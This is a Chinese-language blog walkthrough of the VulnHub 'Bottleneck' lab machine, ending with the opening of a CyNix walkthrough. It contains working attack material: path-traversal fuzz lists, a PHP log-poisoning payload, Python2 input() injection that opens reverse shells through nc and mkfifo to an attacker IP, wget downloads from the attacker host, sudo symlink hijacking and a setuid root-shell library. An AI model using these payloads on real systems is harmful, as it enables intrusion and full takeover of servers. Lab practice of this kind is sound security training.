+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function print_troll()&#123;</span><br><span class="line">    $messages &#x3D; $GLOBALS[&#39;messages&#39;];</span><br><span class="line">    $troll &#x3D; $GLOBALS[&#39;troll&#39;];</span><br><span class="line">    echo $messages[0];</span><br><span class="line">    echo $troll;</span><br><span class="line">&#125;</span><br><span class="line">$troll &#x3D; &lt;&lt;&lt;EOT</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">                                   _,..._</span><br><span class="line">                                  &#x2F;__    \</span><br><span class="line">                                   &gt;&lt; &#96;.  \</span><br><span class="line">                                  &#x2F;_    \ |</span><br><span class="line">                                   \-_  &#x2F;:|</span><br><span class="line">                                 ,--&#39;..&#39;. :</span><br><span class="line">                               ,&#39;         &#96;.</span><br><span class="line">                            _,&#39;             \</span><br><span class="line">                   _.._,--&#39;&#39;    ,           |</span><br><span class="line">               , ,&#39;,, _|    _,.&#39;|      |    |</span><br><span class="line">            \\||&#x2F;,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |</span><br><span class="line">       _     |||                |      &#x2F;-&#39;  |</span><br><span class="line">      | |   (- -)&lt;&#96;._           |     &#x2F;    &#x2F;</span><br><span class="line">      | |  \_\O&#x2F;_&#x2F;&#96;-.(&lt;&lt;        |____&#x2F;    &#x2F;</span><br><span class="line">      | |   &#x2F;   \              &#x2F; -&#39;| &#96;--.&#39;|</span><br><span class="line">      | |   \___&#x2F;             &#x2F;           &#x2F;</span><br><span class="line">      | |    H H             &#x2F;     |     |</span><br><span class="line">      |_|_..-H-H--.._       &#x2F;     ,|     |</span><br><span class="line">        |-.._&quot;_&quot;__..-|     |   _-&#x2F; |     |</span><br><span class="line">        |            |     |    |   \_   |</span><br><span class="line">        |            |     |    |   |    |</span><br><span class="line">        |            |     |____|   |    |</span><br><span class="line">        |            |  _..&#39;    |   |____|</span><br><span class="line">        |            |_(____..._&#39; _.&#39;    |</span><br><span class="line">        &#96;-..______..-&#39;&quot;&quot;         (___..--&#39;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">EOT;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;t&#39;]) || !isset($_GET[&#39;f&#39;]))&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$imagefile &#x3D; base64_decode($_GET[&#39;f&#39;]);</span><br><span class="line">$timestamp &#x3D; time();</span><br><span class="line">$isblocked &#x3D; FALSE;</span><br><span class="line">$blacklist &#x3D; array(&#39;&#x2F;etc&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;var&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;proc&#39;,&#39;&#x2F;dev&#39;,&#39;&#x2F;lib&#39;,&#39;&#x2F;bin&#39;,&#39;&#x2F;usr&#39;,&#39;&#x2F;home&#39;,&#39;&#x2F;ids&#39;);</span><br><span class="line">$messages &#x3D; array(&quot;\nLet me throw away your nice request into the bin.\n&quot;.</span><br><span class="line">    &quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&quot;.</span><br><span class="line">    &quot;Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;);</span><br><span class="line"></span><br><span class="line">if(abs($_GET[&#39;t&#39;] - $timestamp) &gt; 10)&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">foreach($blacklist as $elem)&#123;</span><br><span class="line">    if(strstr($imagefile, $elem) !&#x3D;&#x3D; FALSE)</span><br><span class="line">        $isblocked &#x3D; TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; report the intrusion to the soc and save information locally for further investigation</span><br><span class="line">if($isblocked)&#123;</span><br><span class="line">    $logfile &#x3D; &#39;intrusion_&#39;.$timestamp;</span><br><span class="line">    $fp &#x3D; fopen(&#39;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile, &#39;w&#39;);</span><br><span class="line">    fwrite($fp, &quot;&#39;&quot;.$imagefile.&quot;&#39;&quot;);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    exec(&#39;python &#x2F;opt&#x2F;ids_strong_bvb.py                     &lt;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile.&#39; &gt;&#x2F;tmp&#x2F;output 2&gt;&amp;1&#39;);</span><br><span class="line">    print_troll();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">chdir(&#39;img&#39;);</span><br><span class="line">$filecontent &#x3D; file_get_contents($imagefile);</span><br><span class="line">if($filecontent &#x3D;&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    print_troll();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $filecontent;</span><br><span class="line">&#125;</span><br><span class="line">chdir(&#39;..&#x2F;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那现在就来分析一波源码吧(太菜了 我也看了好久)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$imagefile &#x3D; base64_decode($_GET[&#39;f&#39;]);</span><br><span class="line">$timestamp &#x3D; time();</span><br><span class="line">$isblocked &#x3D; FALSE;</span><br><span class="line">$blacklist &#x3D; array(&#39;&#x2F;etc&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;var&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;proc&#39;,&#39;&#x2F;dev&#39;,&#39;&#x2F;lib&#39;,&#39;&#x2F;bin&#39;,&#39;&#x2F;usr&#39;,&#39;&#x2F;home&#39;,&#39;&#x2F;ids&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>这里就是文件名的解析和时间戳的部分了，注意到还有一个黑名单 这些都不能用</p>
+<p>用了就会输出刚才那条敲门的警告消息</p>
+<p>但是这句执行py文件的就有点东西了嗷</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;python &#x2F;opt&#x2F;ids_strong_bvb.py &lt;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile.&#39; &gt;&#x2F;tmp&#x2F;output 2&gt;&amp;1&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>那么就是说执行这个py文件的时候，会操作soc日志文件，然后写一些东西到/tmp/output这个文件里面去 黑名单里面没有/tmp 所有现在就想读一下这个文件 看写进去的到底是什么 这里又看到代码里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.当参数f的值在黑名单里面的时候 会触发警告消息 直接退出</span><br><span class="line">if($isblocked) 之前会检查是否在黑名单里 在的话 这个值会变成true就 然后就会打印警告消息</span><br><span class="line">2.还有一个就是当文件内容为空的时候</span><br><span class="line">if($filecontent &#x3D;&#x3D;&#x3D; FALSE)&#123;</span><br><span class="line">    print_troll();</span><br><span class="line">&#125; 这里判断文件是否为为 为空则打印警告消息</span><br></pre></td></tr></table></figure>
+
+<p>我直接用下面这个字典的时候 输出了警告消息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br></pre></td></tr></table></figure>
+
+<p>那不应该啊 /tmp不在黑名单里面 那么就是这个文件为空 又上去看代码 为什么为空呢 然后又注意到 它执行写东西到文件的条件是 $isblocked为true 那么我们就需要他执行一次 /tmp/output里面才有内容 所以在读文件之前 要先fuzz一个黑名单里的内容</p>
+<p>所有又构造字典如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br></pre></td></tr></table></figure>
+
+<p>再读一下 然后查看结果文件</p>
+<img data-src="/images/vulnhub/botteneck img/15.png" style="zoom:50%;" />
+
+<p>嗯？ 这个是什么东西 我看了半天看不出所以然 不过还是可以想到第一个payload触发了执行写日志 所以这个report： 应该就是输出到日志的东西</p>
+<p>但是这个/tmp/output 我看不懂 所以就直接问<strong>ins1ght</strong>老哥了</p>
+<p>又去google了一波 发现有些日志文件是可以反弹shell的 那我们就直接再fuzz一波</p>
+<p>构造payload：(构造这个的时候如果是在windows记得把防火墙关了 不关会报病毒)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd&lt;?php system($_GET[&#39;cmd&#39;])?&gt;</span><br><span class="line">&#x2F;tmp&#x2F;output&amp;cmd&#x3D;ls</span><br><span class="line">&#x2F;tmp&#x2F;output&amp;cmd&#x3D;getuid</span><br><span class="line">&#x2F;tmp&#x2F;output&amp;cmd&#x3D;whoami</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output(最后要记得加一个这个 读这个日志文件的内容)</span><br></pre></td></tr></table></figure>
+
+<p>然后执行一波 看能不能反弹shell</p>
+<img data-src="/images/vulnhub/botteneck img/16.png" style="zoom:50%;" />
+
+<p>果然没有想象中的那么美好 没有反弹shell 不过倒是有个报错 这个报错是什么意思？</p>
+<p>先google一波看看 emm 毛都没有 还是在问问<strong>ins1ght</strong>老哥</p>
+<p>老哥说要利用Python2的input的漏洞来getshell 那么下面就开始走上getshell的不归路了</p>
+<h2 id="0x02-input-getshell"><a href="#0x02-input-getshell" class="headerlink" title="0x02 input+getshell"></a>0x02 input+getshell</h2><p><strong>ins1ght</strong>老哥这里推荐几个关于python2的input漏洞的文章</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzc1NDkxLmh0bWw=" title="https://www.secpulse.com/archives/75491.html">SecPulse<i class="fa fa-external-link"></i></span></p>
+<p><span class="exturl" data-url="aHR0cDovL3d3dy5tb29uc2VjLmNvbS9wb3N0LTcxNy5odG1s" title="http://www.moonsec.com/post-717.html">暗月moonsec博客<i class="fa fa-external-link"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjI4OQ==" title="https://xz.aliyun.com/t/2289">先知上一篇关于Python反序列化漏洞利用的文章<i class="fa fa-external-link"></i></span></p>
+<p>我们知道 在python2里面有input和raw_input 两个函数</p>
+<p>raw_input将所有输入作为字符串看待，返回字符串类型，而 input() 相当于 eval(raw_input(prompt)) ，如果来自标准输入的数据是一个恶意的表达式语句，则存在任意代码执行 那么我们就可以利用一下这个点来getshell</p>
+<p>然后打开python2测试一下 有、东西 奥利给</p>
+<img data-src="/images/vulnhub/botteneck img/17.png" style="zoom:50%;" />
+
+<p>按道理说应该是可以在kali攻击机上执行nc 然后我又开了一台ubuntu来作测试 再监听端口 确实可以的</p>
+<p>那么现在就可以构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#39;__import__(&#39;os&#39;).system(&quot;nc -e &#x2F;bin&#x2F;bash 192.168.1.107 8080&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>好的 那么第一次失败了 问了问老哥 说加个and 如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#39;and __import__(&#39;os&#39;).system(&quot;nc -e &#x2F;bin&#x2F;bash 192.168.1.107 8080&quot;) and&#39;</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;output</span><br></pre></td></tr></table></figure>
+
+<p> 看一下返回的结果 什么意思？ 无效的参数 -e</p>
+ <img data-src="/images/vulnhub/botteneck img/18.png" style="zoom:50%;" />
+
+<p>百度一波 原来是ubuntu默认不使用-e参数 那怎么办？</p>
+<p>又构造了下面这个payload(这个payload是借鉴学习了<strong>ins1ght</strong>老哥的)</p>
+<p>第一次使用下面这个payload试一(正向shell kali主动去连接靶机)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)&#x2F;etc&#39; and __import__(&#39;os&#39;).system(&#39;rm -f &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 8080 &gt;&#x2F;tmp&#x2F;f&#39;) and&#39;</span><br><span class="line">2)然后在kali上使用 nc 192.168.1.107 8080</span><br></pre></td></tr></table></figure>
+
+<p>第二次使用了反向的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#39; and __import__(&quot;os&quot;).system(&quot;rm -f &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.105 8080 &gt;&#x2F;tmp&#x2F;f&quot;) and&#39;</span><br></pre></td></tr></table></figure>
+
+<p>kali机监听8080端口 反弹shel成功 先看一下权限(权限很明显是最低的用户权限)</p>
+<img data-src="/images/vulnhub/botteneck img/19.png" style="zoom:50%;" />
+
+<p>payload可以反弹shell msf也可以来反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse_netcat_gaping</span><br><span class="line">set lhost 192.168.1.105</span><br><span class="line">set lport 8080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/20.png" style="zoom:50%;" />
+
+<p>也是成功反弹shell</p>
+<p>那么现在反弹shell成功了 但是是普通用户 想把权限提到root 那下面就提权</p>
+<h2 id="0x03-提升用户权限"><a href="#0x03-提升用户权限" class="headerlink" title="0x03 提升用户权限"></a>0x03 提升用户权限</h2><p>先看一下现在的用户有什么可以执行的文件(SUID权限可执行文件)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/21.png" style="zoom:50%;" />
+
+<p> 都是一些很正常的文件 前面的一个一个看了一下 到了/usr/bin/at的时候发现有点东西 kali里面搜了一下 果然有点东西(kali就是好啊) </p>
+<img data-src="/images/vulnhub/botteneck img/22.png" style="zoom:50%;" />
+
+<p>google一下 发现是个Tru64 UNIX 4.0g的洞 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMjgx" title="https://www.exploit-db.com/exploits/281">exploit-db<i class="fa fa-external-link"></i></span>上有</p>
+<p>我就不多说了 后面的步骤都是借鉴的<strong>ins1ght</strong>老哥的(谢谢<strong>ins1ght</strong>老哥在线解答疑惑QAQ)</p>
+<p>先找一下全局用户可写文件，把结果输出到文件，然后用grep加关键字去筛选</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;tmp&#x2F;report.txt</span><br><span class="line">grep -Ev &#39;&#x2F;proc|&#x2F;sys&#39; &#x2F;tmp&#x2F;report.txt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/23.png" style="zoom:50%;" />
+
+<p> 再查找一下sudo命令权限 sudo -l </p>
+<img data-src="/images/vulnhub/botteneck img/24.png" style="zoom:50%;" />
+
+<p>发现有个bytevsbyte用户的创建的软链接 进去看看</p>
+<img data-src="/images/vulnhub/botteneck img/25.png" style="zoom:50%;" />
+
+<p>链接到了/opt/clear_logs.sh文件上 再去看看</p>
+<img data-src="/images/vulnhub/botteneck img/26.png" style="zoom:50%;" />
+
+<p>只有<code>bytevsbyte</code>用户有修改权限</p>
+<p>然后 用linuxprivchecker.py跑一下 网络信息 lo:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br></pre></td></tr></table></figure>
+
+<p><strong>ins1ght</strong>老哥试了最新的 command-line network traffic analyzer Sudo version 1.8.27 提权漏洞 但是不行 又试了 用LinEnum.sh跑一下 /usr/bin/screen 但靶机没有安装gcc 又气又恨</p>
+<p>那么我们换一种思路 能不能切换bytevsbyte用户 然后执行一下clear_logs.sh</p>
+<p>看能不能获取root有关的信息 那么现在就只有通过这个点来突破</p>
+<p>我们发现clear_logs可以被www-data无密码执行，但只能作为bytevsbyte用户去执行，也就是说拥有的权限也只是bytevsbyte权限，而不是root权限。所以我们可以修改clear_logs软链接的指向，指向我们的脚本，随后运行clear_logs就可以从www-data用户变成bytevsbyte</p>
+<p>那我们现在kali上先创建clear_logs.sh, 然后开启HTTP服务，然后使用wget下载clear_logs到靶机，在使用wget下载的时候加上-O选项将下载的文件“重命名”为clear_logs_copy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;web_untils</span><br><span class="line">wget -O clear_logs_copy http:&#x2F;&#x2F;192.168.1.105&#x2F;clear_logs</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/27.png" style="zoom:50%;" />
+
+<p>但是当我们覆盖clear_logs的时候实际上修改却是去/opt/clear_logs.sh</p>
+<p>这里应该先修改clear_logs软链接的指向，使其指向clear_logs_copy。还记得要给clear_logs_copy赋予可执行权限，下载之后，clear_logs_copy并没有可执行权限。如果没有可执行权限，最后执行命令的时候，会出现错误command not found</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 clear_logs_copy</span><br><span class="line">使用ln -snf修改软链接的指向，使其指向我们的脚本</span><br><span class="line">ln -snf &#x2F;var&#x2F;www&#x2F;html&#x2F;web_utils&#x2F;clear_logs_copy &#x2F;var&#x2F;www&#x2F;html&#x2F;web_utils&#x2F;clear_logs</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/28.png" style="zoom:50%;" />
+
+<p>之后执行/var/www/html/web_utils/clear_logs，就可以切换到bytevsbyte用户，就可以进到相应目录读取到bytevsbyte用户的flag 了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -ubytevsbyte &#x2F;var&#x2F;www&#x2F;html&#x2F;web_untils&#x2F;clear_logs</span><br></pre></td></tr></table></figure>
+
+<p>但是直接执行这条命令 会报一个错 那我就纳闷了 这是啥错啊 google也没有</p>
+<p>到最后还是问了<strong>ins1ght</strong>老哥(<strong>ins1ght</strong>老哥tql) 这里要用python生成一个tty</p>
+<p>然后老哥给了一条命令 执行之后就获得了一个交互式的shell了 就可以切换用户了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; # 有些没有安装Python2，所以需要换成python3 -c</span><br></pre></td></tr></table></figure>
+
+<p>执行之后：(这可来的有点不容易了 卡了我一个晚上)</p>
+<img data-src="/images/vulnhub/botteneck img/29.png" style="zoom:50%;" />
+
+<p> 之后在执行sudo：(直接就切换到了bytevsbyte用户) </p>
+<img data-src="/images/vulnhub/botteneck img/30.png" style="zoom:50%;" />
+
+<p> 然后就可以去cat flag了 哈哈哈哈 </p>
+<img data-src="/images/vulnhub/botteneck img/31.png" style="zoom:50%;" />
+
+<h2 id="0x04-提权到root权限"><a href="#0x04-提权到root权限" class="headerlink" title="0x04 提权到root权限"></a>0x04 提权到root权限</h2><p>那么现在我们是拿到了bytevsbyte的用户权限了 www-data是最低的权限</p>
+<p>现在就可用更高一级的bytevsbyte去寻找更多东西了 看能不能提升到root权限</p>
+<p>重新再找一遍SUID权限的可执行文件</p>
+<img data-src="/images/vulnhub/botteneck img/32.png" style="zoom:50%;" />
+
+<p>这个/usr/test/testlib可就有点东西了 继续深入看看 在这个目录下发现了它的c源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    void *handle;</span><br><span class="line">    int (*function)();</span><br><span class="line">    if(argc &lt; 2)</span><br><span class="line">        return 1;</span><br><span class="line">    handle &#x3D; dlopen(argv[1], RTLD_LAZY);</span><br><span class="line">    function &#x3D; dlsym(handle, &quot;test_this&quot;);</span><br><span class="line">    function();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>emm c的代码好久不接触了 有点不太熟了 先百度了一下这两个函数是不是有什么对应的漏洞 google一波发现这是两个动态调用函数 可以加载动态链接库 那么可以猜出来就是从这两个函数下手了 网上找找exploit <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ppdm9pL3BlbnRlc3QvYmxvYi9tYXN0ZXIvc2hlbGwvcm9vdHNoZWxsLmM=" title="https://github.com/jivoi/pentest/blob/master/shell/rootshell.c">exp的github地址<i class="fa fa-external-link"></i></span></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; gcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.c</span><br><span class="line">&#x2F;&#x2F; chmod u+s &#x2F;tmp&#x2F;rootshell</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(0); setgid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>记得前面要记得加一个#include&lt;stdlib.h&gt;头文件 否则gcc编译不成功 然后在kali</p>
+<p>机上编译成动态链接库文件 从代码来看 文件名需要取成test_this.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared test_this.c -o test_this.so</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/33.png" style="zoom:50%;" />
+
+<p>OK 编译成功 然后在靶机上下载这个so文件 然后直接执行</p>
+<p>这里还有一点 不能直接在/usr/test目录下下载 会没有权限而报错 要去/tmp目录下下载</p>
+<img data-src="/images/vulnhub/botteneck img/34.png" style="zoom:50%;" />
+
+<img data-src="/images/vulnhub/botteneck img/35.png" style="zoom:50%;" />
+
+<p>然后执行这个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;test&#x2F;testlib &#x2F;tmp&#x2F;test_this.so</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/37.png" style="zoom:50%;" />
+
+<img data-src="/images/vulnhub/botteneck img/38.png" style="zoom:50%;" />
+
+<p>一路做下来 碰到很多问题 从一开始发现漏洞到利用漏洞反弹shell 然后提升权限 最后到root权限(期间非常感谢<strong>ins1ght</strong>老哥为我解答疑惑)</p>
+<p>这是第一篇walkthrough 后面应该还会继续做做其他的靶机</p>
+<p>By Oslo(A fake hacker)</p>
+<h1 id="CyNix-Walkthrough"><a href="#CyNix-Walkthrough" class="headerlink" title="CyNix Walkthrough"></a>CyNix Walkthrough</h1><p>第一步先开启靶机 是个Ubuntu的</p>
+<img data-src="/images/vulnhub/CyNix img/1.png" style="zoom:50%;" />
+
+<img data-src="C:\Users\Administrator\Desktop\Folders\blog\CyNix img\2.png" style="zoom:50%;" />
+
+<p>开了个6688的ssh端口 后面再看 现在用gobuster扫一遍</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.0.106 -w &#x2F;root&#x2F;桌面&#x2F;big_dict.txt -x .php,.html,.zip</span><br></pre></td></tr></table></figure>
+
+<p>用这个字典没有扫到有什么有用的页面 可以用gobuster自带的扫一下</p>
+<img data-src="/images/vulnhub/CyNix img/3.png" style="zoom:50%;" />
+
+<p>有个lavalamp 访问一下  这是个新页面 先看看有没有其他东西</p>
+<img data-src="/images/vulnhub/CyNix img/4.png" style="zoom:50%;" />
+
